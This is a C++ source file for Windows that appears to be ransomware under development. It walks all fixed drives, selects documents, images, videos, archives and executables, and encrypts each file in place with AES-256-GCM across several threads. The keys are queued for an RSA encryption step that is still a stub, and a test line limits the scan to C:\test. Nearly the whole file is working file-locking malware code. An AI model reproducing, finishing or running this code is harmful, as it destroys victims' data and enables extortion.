#include <cstdlib>
#include <vector>
#include <set>
#include <tuple>
#include <fstream>
#include <iostream>
#include <thread>

#include <boost\filesystem.hpp>

#include <windows.h>

#include "concurrentqueue.h"
#include "AESCrypto.h"
#include "RSACrypto.h"

using namespace std;
using namespace boost::filesystem;

struct p_producer_bundle {
	moodycamel::ConcurrentQueue<wstring>& q;
	moodycamel::ProducerToken& p;
	atomic<int>& flag;
};

struct k_producer_bundle {
	moodycamel::ConcurrentQueue<tuple<wstring, unsigned char *>>& q;
	moodycamel::ProducerToken& p;
	atomic<int>& flag;
};

struct p_consumer_bundle {
	moodycamel::ConcurrentQueue<wstring>& q;
	moodycamel::ProducerToken& p;
	atomic<int>& prod_flag;
	atomic<int>& cons_flag;
	const int& producer_count;
	const int& consumer_count;
};

struct k_consumer_bundle {
	moodycamel::ConcurrentQueue<tuple<wstring, unsigned char *>>& q;
	moodycamel::ProducerToken& p;
	atomic<int>& prod_flag;
	atomic<int>& cons_flag;
	const int& producer_count;
	const int& consumer_count;
};

struct p_cons_k_prod_bundle {
	p_consumer_bundle& p_cons;
	k_producer_bundle& k_prod;
};

set<wstring>* get_wanted_extentions();
set<wstring>* get_ignore_folders();
vector<wstring>* get_available_drives();

void path_producer_thread(p_producer_bundle& p_bundle);
void path_consumer_thread(p_cons_k_prod_bundle& pk_bundle);
void key_consumer_thread(k_consumer_bundle& k_bundle);

int main(int argc, char* argv[]) {
	/* Stores path of files for encryption */
	moodycamel::ConcurrentQueue<wstring> path_queue;
	moodycamel::ProducerToken path_prod_tok(path_queue);

	/* Stores path for key & (AES key + GCM tag) for encryption */
	moodycamel::ConcurrentQueue<tuple<wstring, unsigned char *>> key_queue;
	moodycamel::ProducerToken key_prod_tok(key_queue);

	const int path_producer_count = 1;
	const int path_consumer_count = 4;
	const int key_encrypter_count = 1;

	thread path_producer;
	thread path_consumers[path_consumer_count];
	thread rsa_thread;

	/* File path consumption pair */
	atomic<int> doneProducer(0);
	atomic<int> doneComsumer(0);

	/* RSA encyption of AES key pair */
	atomic<int> doneProdEnc(0);
	atomic<int> doneConsEnc(0);

	RSACrypto rsa = RSACrypto();

	/* Start path producer thread and fill queue */
	p_producer_bundle path_producer_bundle = { path_queue, path_prod_tok, doneProducer };
	path_producer = thread(bind(&path_producer_thread, ref(path_producer_bundle)));

	/* 
	Start path consumer thread and empty path queue 
	This thread also fills key_queue so we can encrypt aes keys with rsa
	*/
	p_consumer_bundle path_consumer_bundle = { path_queue, path_prod_tok, doneProducer, doneComsumer, path_producer_count, path_consumer_count };
	k_producer_bundle key_producer_bundle = { key_queue , key_prod_tok, doneProdEnc };
	p_cons_k_prod_bundle path_consumer_key_producer_bundle = { path_consumer_bundle, key_producer_bundle };
	for (int i = 0; i < path_consumer_count; ++i) {
		path_consumers[i] = thread(bind(&path_consumer_thread, ref(path_consumer_key_producer_bundle)));
		//consumers[i] = async(launch::async, [&consumer_bundle, i]() {return consume(consumer_bundle, i);});	
	}

	k_consumer_bundle key_consumer_bundle = { key_queue, key_prod_tok, doneProdEnc, doneConsEnc, path_consumer_count, key_encrypter_count };
	rsa_thread = thread(bind(&key_consumer_thread, ref(key_consumer_bundle)));

	/* Have all threads join */
	path_producer.join();
	for (int i = 0; i < path_consumer_count; ++i) {
		path_consumers[i].join();
	}
	rsa_thread.join();

	system("pause");
	return 0;
}

set<wstring>* get_wanted_extentions() {
	set<wstring>* extentions = new set<wstring>();
	// Text
	extentions->insert(L".pdf");
	extentions->insert(L".doc");
	extentions->insert(L".docx");
	extentions->insert(L".txt");
	extentions->insert(L".xls");
	extentions->insert(L".csv");
	// Images 
	extentions->insert(L".jpg");
	extentions->insert(L".jpeg");
	extentions->insert(L".png");
	extentions->insert(L".gif");
	// Video
	extentions->insert(L".webm");
	extentions->insert(L".mkv");
	extentions->insert(L".avi");
	extentions->insert(L".flv");
	extentions->insert(L".mp4");
	extentions->insert(L".wmv");
	extentions->insert(L".mpg");
	extentions->insert(L".mpeg");
	// Compressed
	extentions->insert(L".tar");
	extentions->insert(L".gz");
	extentions->insert(L".zip");
	extentions->insert(L".7z");
	extentions->insert(L".rar");
	// Executables
	extentions->insert(L".exe");
	extentions->insert(L".msi");
	extentions->insert(L".bin");
	extentions->insert(L".iso");

	return extentions;
}

vector<wstring>* get_available_drives() {

	vector<wstring>* drives = new vector<wstring>();

	WCHAR myDrives[512];
	UINT driveType;

	if (!GetLogicalDriveStringsW(ARRAYSIZE(myDrives) - 1, myDrives))
	{
		wprintf(L"GetLogicalDrives() failed with error code: %lu \n", GetLastError());
	}
	else
	{
		wprintf(L"This machine has the following logical drives: \n");

		for (LPWSTR drive = myDrives; *drive != 0; drive += 4)
		{
			driveType = GetDriveTypeW(drive);
			wprintf(L"Drive %s is type %d \n", drive, driveType);
			// Only deal with local drives
			if (driveType == DRIVE_FIXED) {
				wstring drive_string(drive);
				drives->push_back(drive_string);
			}
		}
	}

	return drives;
}


set<wstring>* get_ignore_folders() {
	set<wstring>* ignore_folders = new set<wstring>();

	ignore_folders->insert(L"boost_");
	ignore_folders->insert(L"OpenSSL");
	ignore_folders->insert(L"Perl");
	ignore_folders->insert(L"$");

	return ignore_folders;
}

/* 
Goes through each drive attached on the system and identifies files that 
contain specific extensions adding their full path to a queue for consumption
by the path_consumer_thread
*/
void path_producer_thread(p_producer_bundle& p_bundle) {
	set<wstring>* ignore_folders = get_ignore_folders();
	set<wstring>* wanted_extentions = get_wanted_extentions();
	vector<wstring>* drives = get_available_drives();

	moodycamel::ConcurrentQueue<wstring>& queue = p_bundle.q;
	moodycamel::ProducerToken& ptok = p_bundle.p;
	atomic<int>& flag = p_bundle.flag;

	// Testing
	drives = new vector<wstring>();
	drives->push_back(L"C:\\test");

	// Try searching for data on all drives
	for (wstring drive : *drives) {

		recursive_directory_iterator dir(drive), end;
		while (dir != end) {
			try
			{
				if (is_directory(dir->path())) {
					// Exclude certain paths 
					for (wstring partial_folder_name : *ignore_folders) {
						if (dir->path().wstring().find(partial_folder_name) != string::npos) {
							// Don't iterate further into folder
							dir.no_push();
							// cout << "Excluding -> " << dir->path() << endl;
							break;
						}
					}
				}

				if (is_regular_file(dir->path())) {
					// Only gather files with particular extentions
					if (wanted_extentions->find(dir->path().extension().wstring()) != wanted_extentions->end()) {
						wprintf(L"PRODUCER 1 - Queueing %s \n", &(dir->path().wstring())[0]);
						queue.enqueue(ptok, dir->path().wstring());
					}
				}

				++dir;
			}
			catch (const filesystem_error& ex)
			{
				cout << "PROBLEM PATH - " << dir->path() << endl;
				cout << ex.what() << '\n';
			}
		}
	}
	// Notify we are done producing
	flag.fetch_add(1, memory_order_release);
}

/* 
Consumes full paths provided by the path_producer_thread. Each path (file)
is then encrypted by AES-GCM-256 from which we obtain an AES key (256 bit) 
and a GCM tag (128 bit). This data is then queue for consumption by the
key_consumer_thread
*/
void path_consumer_thread(p_cons_k_prod_bundle& pk_bundle) {
	/* Unpack p_bundle and k_bundle */
	p_consumer_bundle& p_bundle = pk_bundle.p_cons;
	k_producer_bundle& k_bundle = pk_bundle.k_prod;
	
	/* Unpack path consumer bundle */
	moodycamel::ConcurrentQueue<wstring>& p_queue = p_bundle.q;
	moodycamel::ProducerToken& p_ptok = p_bundle.p;
	atomic<int>& p_doneProducer = p_bundle.prod_flag;
	atomic<int>& p_doneConsumer = p_bundle.cons_flag;
	const int& p_producer_count = p_bundle.producer_count;
	const int& p_consumer_count = p_bundle.consumer_count;

	/* Unpack key producer bundle */
	moodycamel::ConcurrentQueue<tuple<wstring, unsigned char *>>& k_queue = k_bundle.q;
	moodycamel::ProducerToken& k_ptok = k_bundle.p;
	atomic<int>& k_doneProducer = k_bundle.flag;

	wstring path_str;
	bool items_left;
	do {
		items_left = p_doneProducer.load(memory_order_acquire) != p_producer_count;
		while (p_queue.try_dequeue_from_producer(p_ptok, path_str)) {
			items_left = true;

			AESCrypto aes = AESCrypto();

			// Save key for key queue (k_queue), will delete ref in key_consumer_thread
			unsigned char * aes_key_and_tag = new unsigned char[32+16]();	// 256 bit key + 128 bit tag
			
			aes.get_aes_key(aes_key_and_tag); // key -> first 32, tag -> last 16
			aes.in_place_encrypt(path_str, aes_key_and_tag + 32);

			

			k_queue.enqueue(k_ptok, make_tuple(path_str, aes_key_and_tag));
		}
	} while (items_left || p_doneConsumer.fetch_add(1, memory_order_acq_rel) + 1 == p_consumer_count);
	k_doneProducer.fetch_add(1, memory_order_release);	// Notify key_queue we are done producing
}

void key_consumer_thread(k_consumer_bundle& k_bundle) {
	/* Unpack key consumer bundle */
	moodycamel::ConcurrentQueue<tuple<wstring, unsigned char *>>& k_queue = k_bundle.q;
	moodycamel::ProducerToken& k_ptok = k_bundle.p;
	atomic<int>& k_doneProducer = k_bundle.prod_flag;
	atomic<int>& k_doneConsumer = k_bundle.cons_flag;
	const int& k_producer_count = k_bundle.producer_count;
	const int& k_consumer_count = k_bundle.consumer_count;

	RSACrypto rsa = RSACrypto();	// 

	tuple<wstring, unsigned char *> path_key_tag;
	wstring path;
	const unsigned char * aes_key_and_tag;	// [aes_key(32)+aes_tag(16)]
	bool items_left;
	do {
		items_left = k_doneProducer.load(memory_order_acquire) != k_producer_count;
		while (k_queue.try_dequeue_from_producer(k_ptok, path_key_tag)) {
			path = get<0>(path_key_tag);
			aes_key_and_tag = get<1>(path_key_tag);
			// DO RSA ENCRYPT ON AES KEY
		}
	} while (items_left || k_doneConsumer.fetch_add(1, memory_order_acq_rel) + 1 == k_consumer_count);
}